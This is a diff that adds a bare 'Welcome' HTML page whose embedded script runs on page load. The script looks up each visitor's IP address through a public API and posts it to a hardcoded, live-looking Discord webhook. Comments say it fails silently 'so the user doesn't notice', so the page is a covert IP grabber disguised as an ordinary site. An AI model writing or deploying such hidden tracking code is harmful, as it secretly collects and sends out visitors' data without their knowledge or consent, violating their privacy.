@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+</head>
+<body>
+    <!-- Your website content goes here -->
+    <h1>Welcome to the site!</h1>
+
+    <script>
+        // Replace this with your actual Discord webhook URL or your own logging endpoint
+        const webhookUrl = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
+
+        // Function to fetch the IP and send it
+        async function logIP() {
+            try {
+                // 1. Fetch the IP address from a public API
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+
+                // 2. Prepare the payload for the webhook
+                const payload = {
+                    content: `New visitor IP logged: **${userIP}**`
+                };
+
+                // 3. Send the IP to your webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                console.log('IP logged successfully (silently).');
+
+            } catch (error) {
+                // Fail silently so the user doesn't notice
+                console.error('Error logging IP:', error);
+            }
+        }
+
+        // Execute the function when the page loads
+        window.onload = logIP;
+    </script>
+</body>
+</html>
